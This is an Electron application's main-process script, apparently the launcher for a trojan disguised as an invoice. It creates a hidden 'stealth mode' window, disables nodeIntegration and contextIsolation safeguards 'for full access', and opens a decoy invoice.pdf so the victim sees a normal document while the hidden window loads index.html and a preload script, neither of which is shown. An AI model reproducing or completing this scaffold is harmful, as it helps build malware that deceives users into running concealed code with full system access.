const { app, BrowserWindow, shell } = require("electron");
const path = require("path");
const fs = require("fs");

function createWindow() {
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      // Security features REMOVED for full access:
      nodeIntegration: true,   // Allow Node.js integration in renderer
      contextIsolation: false, // Disable context isolation
      preload: path.join(__dirname, "preload.js"), // Uncomment if needed
    },
    show: false, // Set to false for stealth mode
  });

  win.setMenuBarVisibility(false); // Remove menu bar for cleaner look
  win.loadFile("index.html");
}

function openDecoyPDF() {
  // This will point to the "resources/app/assets/invoice.pdf" after packaging,
  // and "assets/invoice.pdf" in development.
  const pdfAssetPath = path.join(__dirname, 'assets', 'invoice.pdf');

  // Check if the file actually exists before trying to open it
  if (fs.existsSync(pdfAssetPath)) {
    shell.openPath(pdfAssetPath)
      .then((err) => {
        if (err) {
          console.error('[decoy] Could not open invoice.pdf:', err);
        } else {
          console.log('[decoy] Decoy invoice.pdf opened successfully.');
        }
      });
  } else {
    console.error('[decoy] invoice.pdf not found at', pdfAssetPath);
  }
}

app.whenReady().then(() => {
  createWindow();
  openDecoyPDF();
});

app.on("window-all-closed", () => {
  if (process.platform !== "darwin") app.quit();
});